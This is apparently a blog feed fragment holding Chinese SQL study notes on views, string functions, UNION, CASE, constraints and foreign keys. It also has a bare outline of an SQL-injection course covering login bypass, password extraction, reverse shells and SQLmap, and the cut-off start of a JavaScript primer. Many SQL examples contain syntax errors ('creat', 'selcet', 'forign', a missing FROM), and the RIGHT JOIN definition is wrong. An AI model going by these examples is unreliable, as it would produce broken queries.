href="#join和subquery的实例演示" class="headerlink" title="join和subquery的实例演示"></a>join和subquery的实例演示</h3><h3 id="Left-join-和-Right-join-及-Inner-join介绍"><a href="#Left-join-和-Right-join-及-Inner-join介绍" class="headerlink" title="Left join 和 Right join 及 Inner join介绍"></a>Left join 和 Right join 及 Inner join介绍</h3><p>left join :即左连接，是以左边为基础，根据ON后给出的两表的条件将两表连接起来。结果会将左表所有的查询信息列出，而右表只列出ON后条件与左表满足的部分。左连接全称为左外连接，是外连接的一种。</p><p>right join：即右连接，是以左边为基础，根据ON后给出的两表的条件将两表连接起来。结果会将右表所有的查询信息列出，而左表只列出ON后条件与右表满足的部分。右连接全称为右外连接，是外连接的一种。</p><h2 id="实例演示SQL-String-函数和视图-Views"><a href="#实例演示SQL-String-函数和视图-Views" class="headerlink" title="实例演示SQL String 函数和视图(Views)"></a>实例演示SQL String 函数和视图(Views)</h2><h3 id="database中视图的介绍"><a href="#database中视图的介绍" class="headerlink" title="database中视图的介绍"></a>database中视图的介绍</h3><p>表：Company</p><table><thead><tr><th align="center">Name</th><th align="center">Branch</th><th align="center">Employees</th></tr></thead><tbody><tr><td align="center">HuaWei</td><td align="center">US</td><td align="center">23</td></tr><tr><td align="center">Google</td><td align="center">US</td><td align="center">550</td></tr><tr><td align="center">Yahoo</td><td align="center">Canada</td><td align="center">255</td></tr><tr><td align="center">HuaWei</td><td align="center">China</td><td align="center">450</td></tr><tr><td align="center">HuaWei</td><td align="center">UK</td><td align="center">100</td></tr><tr><td align="center">HuaWei</td><td align="center">Canada</td><td align="center">50</td></tr><tr><td align="center">Yahoo</td><td align="center">US</td><td align="center">230</td></tr><tr><td align="center">Yahoo</td><td align="center">China</td><td align="center">160</td></tr><tr><td align="center">Facebook</td><td align="center">US</td><td align="center">600</td></tr></tbody></table><p>视图是从父表中创建的一个虚表，给特定的人只有访问虚表中的记录，用来隐藏父表中的机密的信息等，因为父表中包含的所有记录的信息</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">创建视图</span><br><span class="line">creat view 视图名 as select * 表名 where 列名&#x3D;&quot;value&quot;</span><br><span class="line"></span><br><span class="line">creat view google_info as select * company where name&#x3D;&quot;Google&quot;;</span><br><span class="line"></span><br><span class="line">之后就可以</span><br><span class="line">select * from google_info</span><br></pre></td></tr></table></figure><h3 id="实例演示view-amp-group-by"><a href="#实例演示view-amp-group-by" class="headerlink" title="实例演示view&amp;group by"></a>实例演示view&amp;group by</h3><p>表：Companyb</p><table><thead><tr><th align="center">Name</th><th align="center">Branch</th><th align="center">Employees</th></tr></thead><tbody><tr><td align="center">Google</td><td align="center">US</td><td align="center">550</td></tr><tr><td align="center">Yahoo</td><td align="center">Canada</td><td align="center">255</td></tr><tr><td align="center">HuaWei</td><td align="center">China</td><td align="center">600</td></tr><tr><td align="center">Facebook</td><td align="center">US</td><td align="center">450</td></tr></tbody></table><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">要求： 选取员工数量大于员工平均数的公司</span><br><span class="line">select avg(Employees) from companyb;</span><br><span class="line">select name,employees from companyb group by name;  #注意此句需要将模式xxx关闭，在my.cnf中配置，且要谨慎使用，在数据库版本5.5之后比较严谨，所以要将xxx模式关闭，且在一对一的关系中才使用。因为使用了group by语句的话，在select 后的列字段，，除了聚合函数以外，其他均要被groupby分组，不能只选一个分组。为了更加严谨，在版本5.5后作出了调整，若不关闭xxx模式，则会报错。</span><br><span class="line">正确答案：</span><br><span class="line">select name,employees from companyb group by name having employees&gt;(select avg(Employees) from companyb);</span><br><span class="line"></span><br><span class="line">然后可以建立一个视图：只显示员工数在平均线以上的公司名称，和公司的员工人数</span><br><span class="line">creat view avg_company as </span><br><span class="line">select name,employees from companyb group by name having employees&gt;(select avg(Employees) from companyb);</span><br><span class="line"></span><br><span class="line">select *from avg_company; 查看虚表</span><br></pre></td></tr></table></figure><h3 id="String函数-concat和substring"><a href="#String函数-concat和substring" class="headerlink" title="String函数-concat和substring"></a>String函数-concat和substring</h3><p><strong>concat()**传两个字符串作为参数，</strong>用来合并两个字符串**。</p><p>语法：  concat(colum_name,colum_name)</p><p><code>select concat(name,branch) as branches from company</code></p><p>**substring()**：用来取字符串的值<br>语法：substring(colum_name，从第几个开始取，取几个)<br><code>select substring(name,5,2) from company name=&quot;facebook;&quot;</code> # 返回bo，从facebook第五个字符开始取,取两位</p><h3 id="String函数-replace"><a href="#String函数-replace" class="headerlink" title="String函数-replace"></a>String函数-replace</h3><p><strong>语法</strong>：replace(想被替换的colum_name,想被替换掉的字符，替换成什么) </p><p><code>select replace(name,&quot;Facebook&quot;,&quot;脸书&quot;) from company where name=&quot;Facebook&quot;;</code></p><h3 id="String函数length-trim及limit关键字"><a href="#String函数length-trim及limit关键字" class="headerlink" title="String函数length trim及limit关键字"></a>String函数length trim及limit关键字</h3><p><strong>length()函数</strong>用来返回字符串的长度<br>语法：length(colum_name)<br><code>select length(name) from company where name=&quot;Google&quot;</code></p><p><strong>trim()函数</strong>用来去掉字符串前面和后面的空格<br>trim(“  good  “)<br><code>select trim(&quot;  good  &quot;); # 结果为good</code></p><p><strong>limit关键字</strong>用限制显示几条记录<br><code>select * from company limit 3; #则只显示前3条记录</code></p><h2 id="混杂的SQL关键字-Union、Intersect、Exist、Case、UnionAll-及其用法"><a href="#混杂的SQL关键字-Union、Intersect、Exist、Case、UnionAll-及其用法" class="headerlink" title="混杂的SQL关键字(Union、Intersect、Exist、Case、UnionAll)及其用法"></a>混杂的SQL关键字(Union、Intersect、Exist、Case、UnionAll)及其用法</h2><p>本节学习要使用的表：<br>表1：stu1  </p><table><thead><tr><th align="center">id</th><th align="center">name</th></tr></thead><tbody><tr><td align="center">1001</td><td align="center">陈宇明</td></tr><tr><td align="center">1002</td><td align="center">黎明峰</td></tr><tr><td align="center">2001</td><td align="center">陈泽鑫</td></tr><tr><td align="center">2002</td><td align="center">郑炜畅</td></tr></tbody></table><p>表2：stu2  (存储了大二大三的学生)</p><table><thead><tr><th align="center">id</th><th align="center">name</th></tr></thead><tbody><tr><td align="center">2002</td><td align="center">郑炜畅</td></tr><tr><td align="center">3001</td><td align="center">肖裕帆</td></tr><tr><td align="center">3002</td><td align="center">刘琪顺</td></tr></tbody></table><h3 id="SQL-关键字-Union和Union-ALL"><a href="#SQL-关键字-Union和Union-ALL" class="headerlink" title="SQL 关键字 Union和Union ALL"></a>SQL 关键字 Union和Union ALL</h3><p><strong>Union</strong>合并两张表,且会自动过滤重复的记录</p><p>使用场景：表stu1 (存储了大一大二的学生)，表stu2 (存储了大二大三的学生)，要维护两张表，麻烦，要将两张表合并成一张表</p><p><code>select * from stu1 union(select * from stu2)</code><br>表会变成：</p><table><thead><tr><th align="center">id</th><th align="center">name</th></tr></thead><tbody><tr><td align="center">1001</td><td align="center">陈宇明</td></tr><tr><td align="center">1002</td><td align="center">黎明峰</td></tr><tr><td align="center">2001</td><td align="center">陈泽鑫</td></tr><tr><td align="center">2002</td><td align="center">郑炜畅</td></tr><tr><td align="center">3001</td><td align="center">肖裕帆</td></tr><tr><td align="center">3002</td><td align="center">刘琪顺</td></tr></tbody></table><p><strong>union all</strong>单纯合并两张表，不会过滤重复记录，两张表原原本本的合并</p><h3 id="用逻辑实现从两张表里取交集Intersect"><a href="#用逻辑实现从两张表里取交集Intersect" class="headerlink" title="用逻辑实现从两张表里取交集Intersect"></a>用逻辑实现从两张表里取交集Intersect</h3><p>场景： stu1 存储的是参加考试的学生，stu2是存储通过考试的学生，要得到参加考试的学生中谁通过了考试</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">select * from stu1 intersect (select * from stu2); # 即可取到两表的交集</span><br><span class="line"></span><br><span class="line">但在mysql中没有intersect关键字，要用逻辑实现从两表中取交集</span><br><span class="line"></span><br><span class="line">select * from stu1 where id in (select id from stu2);</span><br></pre></td></tr></table></figure><h3 id="SQL中Exists关键字用法"><a href="#SQL中Exists关键字用法" class="headerlink" title="SQL中Exists关键字用法"></a>SQL中Exists关键字用法</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">用法：你想执行的quary是基于另外一个条件的</span><br><span class="line"></span><br><span class="line">实例场景：一个学生属于某个特定的college学生,才能取对应college的记录</span><br><span class="line">quary1：取college整张表的数据</span><br><span class="line">quary2：这个学生属于某个特定的college</span><br><span class="line"></span><br><span class="line">quary1 exist quary2  # 先执行quary2，当quary2存在，exist会将quary2标记成true，才会执行quary1，当quary2 为 Null，即为false时，不会执行quary1</span><br><span class="line"></span><br><span class="line">select * from college where exist(select *from college where name&#x3D;&quot;刘琪顺&quot;);</span><br></pre></td></tr></table></figure><h3 id="实例演示SQL中CASE语句-动态表"><a href="#实例演示SQL中CASE语句-动态表" class="headerlink" title="实例演示SQL中CASE语句-动态表"></a>实例演示SQL中CASE语句-动态表</h3><p>改表中的值<br>语法: case 列 when 条件(列中的谁 then 对要修改的列的相应操作) else 相应的操作</p><p>表marks：</p><table><thead><tr><th align="center">score</th><th align="center">name</th></tr></thead><tbody><tr><td align="center">40</td><td align="center">陈宇明</td></tr><tr><td align="center">60</td><td align="center">黎明峰</td></tr><tr><td align="center">70</td><td align="center">陈泽鑫</td></tr><tr><td align="center">80</td><td align="center">郑炜畅</td></tr></tbody></table><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Case语句的实用案例：</span><br><span class="line"></span><br><span class="line">selcet score,case name</span><br><span class="line">when &quot;陈宇明&quot;then score*2  # 当从name列中找到值为陈宇明的，将其分数*2</span><br><span class="line">when &quot;陈泽鑫&quot;then score-10</span><br><span class="line">when &quot;郑伟畅&quot;then score+10</span><br><span class="line">else score;   # 其他的分数一样</span><br><span class="line">end</span><br><span class="line">&quot;NewScore&quot; from marks  #创建新列，存储刚刚修改过的列的值</span><br></pre></td></tr></table></figure><h2 id="数据约束-data-constraints-对数据库测试的重要性"><a href="#数据约束-data-constraints-对数据库测试的重要性" class="headerlink" title="数据约束(data constraints)对数据库测试的重要性"></a>数据约束(data constraints)对数据库测试的重要性</h2><p>约束是一种限制，他是用来限制写进表里的数据的</p><h3 id="NOT-NULL-Constraint"><a href="#NOT-NULL-Constraint" class="headerlink" title="NOT NULL Constraint"></a>NOT NULL Constraint</h3><p>默认的一个列的值可以是NULL，如果你不允许列中有NULL值，就可以用NOT NULL约束</p><h3 id="NOT-NULL约束验证和测试"><a href="#NOT-NULL约束验证和测试" class="headerlink" title="NOT NULL约束验证和测试"></a>NOT NULL约束验证和测试</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">creat table flight(flightname varchar(20),flightid integer not null); # 创建一个带有约束的表</span><br><span class="line"></span><br><span class="line">describe flight # 查看表结构</span><br><span class="line">insert into flight value(&quot;test&quot;,null);# 会报错，因为id列的value不能为null</span><br></pre></td></tr></table></figure><h3 id="default约束的验证及测试"><a href="#default约束的验证及测试" class="headerlink" title="default约束的验证及测试"></a>default约束的验证及测试</h3><p>default约束是当insert into语句没有在列中插入特定值时，就给一列提供一个默认值</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">creat table tab2(name varchar(20),age integer default 25);</span><br><span class="line"></span><br><span class="line">当 insert into tab2 value(&quot;小明&quot;); 只插入了name的值，没有插入age的值的时候，它自动提供一个25的值</span><br><span class="line"></span><br><span class="line">也可以用指定插入：insert into tab2 (name)value(&quot;小明&quot;);</span><br><span class="line"></span><br><span class="line">select*from tab2; 返回的是 小明，25</span><br><span class="line"></span><br><span class="line">运用的场景可以是，企业中hr只提供了新员工的信息，却没录入哪一个部门，那么可以用default约束，给没有分配部门的员工划分在xxx部门</span><br></pre></td></tr></table></figure><h3 id="unique约束的验证和测试"><a href="#unique约束的验证和测试" class="headerlink" title="unique约束的验证和测试"></a>unique约束的验证和测试</h3><p>unique约束确保一个列里面所有的值都是唯一的</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">运用场景：当输入员工id或者是学生学号的时候，要确保每一个id都是唯一的等，就可以用到unique的约束</span><br><span class="line"></span><br><span class="line">creat table tab3 (name varchar(20),id integer unique);</span><br><span class="line">insert into tab3 (name,id) value(&quot;小明&quot;,1001);</span><br><span class="line">insert into tab3 (name,id) value(&quot;小明&quot;,1001);# 插入id重复会报错</span><br></pre></td></tr></table></figure><h3 id="外额-check约束"><a href="#外额-check约束" class="headerlink" title="外额 check约束"></a>外额 check约束</h3><p>mysql不支持，sql server支持</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">creat table tab3 (name varchar(20),age integer check(integer&gt;20)); # 表示插入的age值要大于20</span><br></pre></td></tr></table></figure><h3 id="Primary-key约束的验证和测试"><a href="#Primary-key约束的验证和测试" class="headerlink" title="Primary key约束的验证和测试"></a>Primary key约束的验证和测试</h3><p>主键，用于唯一表示表中的每一行主键不能为空，因为用NULL值取标识一个唯一的记录没有意义<br>因此，被设置为主键或主键的一部分的列不能为空</p><p>主键，用来唯一标识记录的，设置员工id为主键，则可以通过id查找到对应员工的所有信息，主键可以不止设置一个，但设置为主键的列一定不能为空，且必定唯一。NOT NULL约束加上UNIQUE约束，就是Primary key约束。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">creat table empdb(name varchar(20),branch varchar(20),empid int,primary key(empid))</span><br></pre></td></tr></table></figure><h2 id="实例演示外键Foreign-Key和主键Primary-Key"><a href="#实例演示外键Foreign-Key和主键Primary-Key" class="headerlink" title="实例演示外键Foreign Key和主键Primary Key"></a>实例演示外键Foreign Key和主键Primary Key</h2><h3 id="SQL中外键约束–Foreign-Key"><a href="#SQL中外键约束–Foreign-Key" class="headerlink" title="SQL中外键约束–Foreign Key"></a>SQL中外键约束–Foreign Key</h3><p>外键是引用另一个表的列(通常是主键)的列。<br>外键的目的是确保数据的引用完整性</p><p>表1：OrderDetails 订单详情</p><table><thead><tr><th align="center">orderid</th><th align="center">userid</th><th align="center">amount</th><th align="center">date</th><th align="center">product</th></tr></thead><tbody><tr><td align="center">1001</td><td align="center">5118210</td><td align="center">3000</td><td align="center">12-Feb</td><td align="center">phone</td></tr><tr><td align="center">1002</td><td align="center">5118210</td><td align="center"></td><td align="center"></td><td align="center"></td></tr><tr><td align="center">1003</td><td align="center">5118248</td><td align="center"></td><td align="center"></td><td align="center"></td></tr></tbody></table><p>表2：UserDetails 用户详情</p><table><thead><tr><th align="center">userid</th><th align="center">address</th></tr></thead><tbody><tr><td align="center">5118210</td><td align="center">Shenzhen</td></tr><tr><td align="center">5118248</td><td align="center">Shanghai</td></tr></tbody></table><p>表一的主键是orderid，表二的主键是userid<br>表一中的userid是表二的主键，所以表一中的userid可以作为外键</p><p>表一的外键会映射表二的主键，当有人要下订单的时候，通过表一外键userid映射到表二，去查找看表二有无对应的userid，看看用户有没有注册，确认有用户之后才将订单信息加入到表一。<br>而且，要删除表二的用户信息时，因为表二中的主键userid与另外一个表中的userid外键绑定了，外键依赖主键，要删除用户信息时，要先删除其外键的相关信息，才能删的了主键的。比如要删除表2中的用户5118248，要先删除表一中关于5118248的相关订单后才能删除</p><h3 id="用实例讲解外键-foreign-key-的规则和约束"><a href="#用实例讲解外键-foreign-key-的规则和约束" class="headerlink" title="用实例讲解外键(foreign key)的规则和约束"></a>用实例讲解外键(foreign key)的规则和约束</h3><p>运用上表：刚开始各值都是NULL的。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"># 创建表userdetails</span><br><span class="line">creat table userdetails(userid int(50),address varchar(50),primary key(userid));</span><br><span class="line"></span><br><span class="line"># 创建表orderdetails</span><br><span class="line">creat table orderdetails(orderid int(50),userid int(50),amount int(50), date varchar(50),product varchar(50),</span><br><span class="line">primary key(orderid),forign key(userid) REFERENCES userdetails(userid);</span><br><span class="line"></span><br><span class="line"># 向表userdetails中插入信息</span><br><span class="line">insert into userdetails values(5118210,&quot;Shenzhen&quot;);</span><br><span class="line"></span><br><span class="line"># 向表orderdetails中插入信息</span><br><span class="line">insert into orderdetails values(1004,5118222,3000,&quot;Mar&quot;,&quot;phone&quot;); # 插入此信息会报错，因为外键5118222，会先映射到userdetails表中查找，是否有此用户id，若没有则不允许插入</span><br><span class="line"></span><br><span class="line"># 向表orderdetails中插入信息</span><br><span class="line">insert into orderdetails values(1004,5118210,3000,&quot;Feb&quot;,&quot;phone&quot;); # 插入信息成功，因为userdetails中存在5118210的id</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># 删除表userdetails中id为5118210的用户</span><br><span class="line">delete from userdetails where id&#x3D;5118210; </span><br><span class="line"># 报错，因为有外键因素依赖这个主键，所以删不掉，要手动将外键中依赖此主键的记录先删除才可以删除。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">绑定了的主外键，要插入信息，先有主键，再有外键。要删除信息，先删外键，再删主键，否则就会报错，无法执行。</span><br></pre></td></tr></table></figure><h3 id="ON-DELETE-CASCADE关键字来强制删除外键的规则"><a href="#ON-DELETE-CASCADE关键字来强制删除外键的规则" class="headerlink" title="ON DELETE CASCADE关键字来强制删除外键的规则"></a>ON DELETE CASCADE关键字来强制删除外键的规则</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"># 创建表userdetails</span><br><span class="line">creat table userdetails(userid int(50),address varchar(50),primary key(userid));</span><br><span class="line"></span><br><span class="line"># 创建表orderdetails</span><br><span class="line">creat table orderdetails(orderid int(50),userid int(50),amount int(50), date varchar(50),product varchar(50),</span><br><span class="line">primary key(orderid),forign key(userid) REFERENCES userdetails(userid) on delete cascade;</span><br><span class="line"></span><br><span class="line">在创建表时，在外键参考(refferences)关联主键的时候，后边加上on delete cascade，那么在删除主键的时候，会自动的帮我们查找其对应的外键，并删除</span><br><span class="line"></span><br><span class="line">delete from userdetails where id&#x3D;5118210; # 就可以直接删除了，且会自动删除其子表外键记录</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="与Selenium继承的JSBC连接-要求基本自动化知识"><a href="#与Selenium继承的JSBC连接-要求基本自动化知识" class="headerlink" title="与Selenium继承的JSBC连接(要求基本自动化知识)"></a>与Selenium继承的JSBC连接(要求基本自动化知识)</h2><h3 id="mysql-driver的下载"><a href="#mysql-driver的下载" class="headerlink" title="mysql driver的下载"></a>mysql driver的下载</h3><h3 id="jdbc编程–创建项目"><a href="#jdbc编程–创建项目" class="headerlink" title="jdbc编程–创建项目"></a>jdbc编程–创建项目</h3><h3 id="创建数据库及表以及连接到jdbc-java代码"><a href="#创建数据库及表以及连接到jdbc-java代码" class="headerlink" title="创建数据库及表以及连接到jdbc java代码"></a>创建数据库及表以及连接到jdbc java代码</h3><h3 id="用java代码从数据库里面取数据用在Selenium自动化测试中"><a href="#用java代码从数据库里面取数据用在Selenium自动化测试中" class="headerlink" title="用java代码从数据库里面取数据用在Selenium自动化测试中"></a>用java代码从数据库里面取数据用在Selenium自动化测试中</h3><h2 id="搭建渗透环境-为SQL注入准备"><a href="#搭建渗透环境-为SQL注入准备" class="headerlink" title="搭建渗透环境(为SQL注入准备)"></a>搭建渗透环境(为SQL注入准备)</h2><h3 id="VirtualBox简介及需要安装的软件"><a href="#VirtualBox简介及需要安装的软件" class="headerlink" title="VirtualBox简介及需要安装的软件"></a>VirtualBox简介及需要安装的软件</h3><h3 id="安装Kali2018到虚拟机"><a href="#安装Kali2018到虚拟机" class="headerlink" title="安装Kali2018到虚拟机"></a>安装Kali2018到虚拟机</h3><h3 id="安装Metasploitable到虚拟机"><a href="#安装Metasploitable到虚拟机" class="headerlink" title="安装Metasploitable到虚拟机"></a>安装Metasploitable到虚拟机</h3><h3 id="Kali-Linux基本介绍"><a href="#Kali-Linux基本介绍" class="headerlink" title="Kali Linux基本介绍"></a>Kali Linux基本介绍</h3><h3 id="Linux-Terminal-及Linux基本命令"><a href="#Linux-Terminal-及Linux基本命令" class="headerlink" title="Linux Terminal 及Linux基本命令"></a>Linux Terminal 及Linux基本命令</h3><h3 id="配置Metasploitable及环境的网络设置"><a href="#配置Metasploitable及环境的网络设置" class="headerlink" title="配置Metasploitable及环境的网络设置"></a>配置Metasploitable及环境的网络设置</h3><h2 id="SQL注入漏洞"><a href="#SQL注入漏洞" class="headerlink" title="SQL注入漏洞"></a>SQL注入漏洞</h2><h3 id="什么是SQL？"><a href="#什么是SQL？" class="headerlink" title="什么是SQL？"></a>什么是SQL？</h3><h3 id="SQL注入的危险"><a href="#SQL注入的危险" class="headerlink" title="SQL注入的危险"></a>SQL注入的危险</h3><h3 id="在POST中发现SQL注入"><a href="#在POST中发现SQL注入" class="headerlink" title="在POST中发现SQL注入"></a>在POST中发现SQL注入</h3><h3 id="使用SQL注入漏洞绕过登录限制"><a href="#使用SQL注入漏洞绕过登录限制" class="headerlink" title="使用SQL注入漏洞绕过登录限制"></a>使用SQL注入漏洞绕过登录限制</h3><h3 id="【Security】防止登录页面中的SQL注入"><a href="#【Security】防止登录页面中的SQL注入" class="headerlink" title="【Security】防止登录页面中的SQL注入"></a>【Security】防止登录页面中的SQL注入</h3><h2 id="SQL注入漏洞———从数据库中提取数据"><a href="#SQL注入漏洞———从数据库中提取数据" class="headerlink" title="SQL注入漏洞———从数据库中提取数据"></a>SQL注入漏洞———从数据库中提取数据</h2><h3 id="在GET中发现SQL注入"><a href="#在GET中发现SQL注入" class="headerlink" title="在GET中发现SQL注入"></a>在GET中发现SQL注入</h3><h3 id="读取数据库信息"><a href="#读取数据库信息" class="headerlink" title="读取数据库信息"></a>读取数据库信息</h3><h3 id="发现数据库中的表"><a href="#发现数据库中的表" class="headerlink" title="发现数据库中的表"></a>发现数据库中的表</h3><h3 id="提取敏感数据–如密码等"><a href="#提取敏感数据–如密码等" class="headerlink" title="提取敏感数据–如密码等"></a>提取敏感数据–如密码等</h3><h2 id="SQL注入漏洞-高级漏洞发掘"><a href="#SQL注入漏洞-高级漏洞发掘" class="headerlink" title="SQL注入漏洞-高级漏洞发掘"></a>SQL注入漏洞-高级漏洞发掘</h2><h3 id="发现和利用盲SQL注入"><a href="#发现和利用盲SQL注入" class="headerlink" title="发现和利用盲SQL注入"></a>发现和利用盲SQL注入</h3><h3 id="发现更复杂的SQL注入"><a href="#发现更复杂的SQL注入" class="headerlink" title="发现更复杂的SQL注入"></a>发现更复杂的SQL注入</h3><h3 id="通过使用更难的SQL注入提取数据-密码"><a href="#通过使用更难的SQL注入提取数据-密码" class="headerlink" title="通过使用更难的SQL注入提取数据(密码)"></a>通过使用更难的SQL注入提取数据(密码)</h3><h3 id="绕过过滤器"><a href="#绕过过滤器" class="headerlink" title="绕过过滤器"></a>绕过过滤器</h3><h3 id="绕过安全检查和访问所有记录"><a href="#绕过安全检查和访问所有记录" class="headerlink" title="绕过安全检查和访问所有记录"></a>绕过安全检查和访问所有记录</h3><h3 id="【Security】快速修复，防止SQL注入"><a href="#【Security】快速修复，防止SQL注入" class="headerlink" title="【Security】快速修复，防止SQL注入"></a>【Security】快速修复，防止SQL注入</h3><h3 id="使用SQL注入漏洞在服务器上读写文件"><a href="#使用SQL注入漏洞在服务器上读写文件" class="headerlink" title="使用SQL注入漏洞在服务器上读写文件"></a>使用SQL注入漏洞在服务器上读写文件</h3><h3 id="获取反向Shell访问权并获得对Web服务器的完全控制"><a href="#获取反向Shell访问权并获得对Web服务器的完全控制" class="headerlink" title="获取反向Shell访问权并获得对Web服务器的完全控制"></a>获取反向Shell访问权并获得对Web服务器的完全控制</h3><h3 id="发现SQL注入和使用SQLmap提取数据"><a href="#发现SQL注入和使用SQLmap提取数据" class="headerlink" title="发现SQL注入和使用SQLmap提取数据"></a>发现SQL注入和使用SQLmap提取数据</h3><h3 id="使用SQLmap获取直接的SQL-shell"><a href="#使用SQLmap获取直接的SQL-shell" class="headerlink" title="使用SQLmap获取直接的SQL shell."></a>使用SQLmap获取直接的SQL shell.</h3><h3 id="【Security】防止SQL注入的正确方法"><a href="#【Security】防止SQL注入的正确方法" class="headerlink" title="【Security】防止SQL注入的正确方法"></a>【Security】防止SQL注入的正确方法</h3>]]></content>
      
      
      <categories>
          
          <category> 数据库 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SQL </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>JavaScript</title>
      <link href="posts/18006.html"/>
      <url>posts/18006.html</url>
      
        <content type="html"><![CDATA[<h2 id="了解JavaScript"><a href="#了解JavaScript" class="headerlink" title="了解JavaScript"></a>了解JavaScript</h2><h3 id="1-概述："><a href="#1-概述：" class="headerlink" title="1.概述："></a>1.概述：</h3><p>JavaScript是目前web开发中不可缺少的<strong>脚本</strong>语言，js不需要编译即可运行，运行在客户端，需要通过浏览器来解析执行JavaScript代码。</p><p>诞生于1995年，当时的主要目的是<strong>验证表单的数据是否合法</strong>。</p><p>JavaScript本来应该叫Livescript，但是在发布前夕，想搭上当时超热的java顺风车，临时把名字改为了JavaScript。（也就是说js跟java没有关系，当时只是想借助java的名气）。</p><h3 id="2-JS的组成部分"><a href="#2-JS的组成部分" class="headerlink" title="2.JS的组成部分"></a>2.JS的组成部分</h3><table><thead><tr><th align="center">组成部分</th><th align="center">作用</th></tr></thead><tbody><tr><td align="center">ECMA Script</td><td align="center">构成了JS核心的语法基础</td></tr><tr><td align="center">BOM</td><td align="center">Browser Object Model 浏览器对象模型，用来操作浏览器上的对象</td></tr><tr><td align="center">DOM</td><td align="center">Document Object Model 文档对象模型，用来操作网页中的元素</td></tr></tbody></table><ul><li><p>核心（ECMAScript）：这一部分主要是js的基本语法。</p></li><li><p>BOM：Brower Object Model（浏览器对象模型），主要是获取浏览器信息或操作浏览器的，例如：浏览器的前进与后退、浏览器弹出提示框、浏览器地址栏输入网址跳转等操作等。</p></li><li><p>DOM：Document Object Model（文档对象模型），此处的文档暂且理解为html，html加载到浏览器的内存中，可以使用js的DOM技术对内存中的html节点进行修改，用户从浏览器看到的是js动态修改后的页面。（增删改查）</p></li></ul><h3 id="JS的特点："><a href="#JS的特点：" class="headerlink" title="JS的特点："></a>JS的特点：</h3><ol><li>交互性（它可以做的就是信息的动态交互）</li><li>安全性（不允许直接访问本地硬盘）</li><li>跨平台性（只要是可以解析js的浏览器都可以执行，和平台无关）</li></ol><h3 id="JS和Java的区别："><a href="#JS和Java的区别：" class="headerlink" title="JS和Java的区别："></a>JS和Java的区别：</h3><table><thead><tr><th align="center">JavaScript</th><th align="center">Java</th></tr></thead><tbody><tr><td align="center">弱类型语言</td><td align="center">强类型语言</td></tr></tbody></table><h3 id="JS的作用"><a href="#JS的作用" class="headerlink" title="JS的作用"></a>JS的作用</h3><p>avaScript 被用来改进设计、验证表单、检测浏览器、创建cookies，等等。JavaScript 是因特网上最流行的脚本语言，并且可在所有主要的浏览器中运行，比如： Internet Explorer、 Maxthon、Mozilla、Firefox、Netscape、Chrome和 Opera等。</p><p>在目前学习阶段只要记住最常用的二个：（1）运态修改html及css代码 （2）验证表单</p><h2 id="JavaScript-的基本用法"><a href="#JavaScript-的基本用法" class="headerlink" title="JavaScript 的基本用法"></a>JavaScript 的基本用法</h2><ol><li>HTML 中的脚本必须位于 <script> 与 </script> 标签之间。</li><li>脚本可被放置在 HTML 页面的 <body> 和 <head> 部分中。</li><li>注释：跟java中一样，单行注释：”//“ ,多行注释：”/*  */“</li></ol><hr><h3 id="lt-script-gt-标签"><a href="#lt-script-gt-标签" class="headerlink" 